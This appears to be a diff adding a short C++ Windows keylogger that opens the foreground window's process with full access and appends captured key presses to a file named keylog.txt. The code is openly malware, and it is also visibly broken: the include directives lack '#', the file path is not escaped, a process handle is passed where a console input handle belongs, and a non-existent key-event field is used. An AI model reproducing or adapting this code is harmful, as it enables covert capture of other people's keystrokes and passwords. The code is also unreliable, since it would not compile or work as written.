@@ -1,0 +1,36 @@
+include <windows.h>
+include <iostream>
+include <fstream>
+
+int main() {
+std::ofstream logFile("C:\keylog.txt", std::ios::app);
+if (!logFile) {
+std::cerr << "Failed to open log file!" << std::endl;
+return 1;
+}
+
+HWND hwnd = GetForegroundWindow();  
+DWORD processID;  
+GetWindowThreadProcessId(hwnd, &processID);  
+
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);  
+if (!hProcess) {  
+    std::cerr << "Failed to open process!" << std::endl;  
+    return 1;  
+}  
+
+INPUT_RECORD irRec;  
+DWORD dwRead;  
+while (ReadConsoleInput(hProcess, &irRec, 1, &dwRead)) {  
+    if (irRec.EventType == KEY_EVENT && irRec.Event.KeyEvent.bKeyDown) {  
+        char key = irRec.Event.KeyEvent.wChar;  
+        logFile << key;  
+        logFile.flush();  
+    }  
+}  
+
+logFile.close();  
+CloseHandle(hProcess);  
+return 0;  
+
+}
